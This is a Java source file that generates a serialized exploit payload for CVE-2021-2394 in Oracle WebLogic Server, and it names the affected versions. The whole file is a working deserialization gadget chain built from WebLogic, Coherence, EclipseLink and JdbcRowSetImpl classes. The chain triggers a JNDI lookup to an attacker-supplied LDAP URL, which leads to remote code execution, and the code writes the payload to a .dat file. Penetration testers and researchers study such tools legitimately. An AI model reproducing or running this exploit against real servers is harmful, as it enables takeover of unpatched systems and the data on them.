package com._51pwn.CVE_2021_2394;

import com._51pwn.Tools;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;
import oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor;
import org.eclipse.persistence.exceptions.DescriptorException;
import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
import org.eclipse.persistence.mappings.AttributeAccessor;
import ysoserial.payloads.util.Reflections;

// CVE-2021-2394
/*
Oracle WebLogic Server 10.3.6.0.0
Oracle WebLogic Server 12.1.3.0.0
Oracle WebLogic Server 12.2.1.3.0
Oracle WebLogic Server 12.2.1.4.0
Oracle WebLogic Server 14.1.1.0.0
* */
public class Main {

    public static class TLSAttributeAccessor extends AttributeAccessor {
        public Object getAttributeValueFromObject(Object o) throws DescriptorException {
            return this.attributeName;
        }

        public void setAttributeValueInObject(Object o, Object o1) throws DescriptorException {
            this.attributeName = "51pwn";
        }
    }
    public static void main(String[] args) throws Exception {
        System.setProperty("sun.io.serialization.extendedDebugInfo", "true");
        String ldap = args[0];//"ldap://docker.for.mac.localhost:1389/UpX34defineClass";
        System.out.println(ldap);
        // 未后续 操作 方法 getDatabaseMetaData 进行定义
        MethodAttributeAccessor accessor = Tools.GetMethodAttributeAccessor("connect");
        accessor.setSetMethodName("setConnection");
        JdbcRowSetImpl jdbcRowSet = Tools.GetJdbcRowSetImpl(ldap);

        FilterExtractor extractor = new FilterExtractor(accessor);
        FilterExtractor extractor1 = new FilterExtractor(new TLSAttributeAccessor());
        SortedBag sortedBag = new TopNAggregator.PartialResult(extractor1, 2);
        AttributeHolder attributeHolder = new AttributeHolder();
        sortedBag.add(jdbcRowSet);

        Reflections.setFieldValue(sortedBag,"m_comparator",extractor);
        // setInternalValue
        Reflections.setFieldValue(attributeHolder,"m_oValue",sortedBag);

        Tools.WtOo1(attributeHolder,"CVE_2021_2394_Payload.dat");
        System.out.println("write ok CVE_2021_2394_Payload.dat");

//        com._51pwn.hktalent.CreatJar.main(args);
    }
}
